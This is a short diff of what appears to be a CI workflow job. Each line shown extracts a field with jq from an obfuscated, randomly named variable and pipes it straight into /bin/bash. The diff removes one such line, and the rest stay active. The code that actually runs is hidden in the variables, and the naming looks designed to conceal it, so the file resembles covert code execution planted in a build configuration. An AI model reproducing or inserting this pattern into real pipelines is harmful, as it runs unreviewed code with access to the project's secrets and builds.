@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$x0" | jq -r .fg42 | /bin/bash
           printf '%s' "$wschq09795" | jq -r .pb487 | /bin/bash
           echo $wr64715 | jq -r .nnps66 | /bin/bash
-          printf '%s' "$skl44691" | jq -r .okg63777 | /bin/bash
           echo $arkkt97197 | jq -r .g6 | /bin/bash
           printf '%s' "$xhwt07634" | jq -r .hdy8935 | /bin/bash
           printf '%s' "$v6" | jq -r .u2910 | /bin/bash
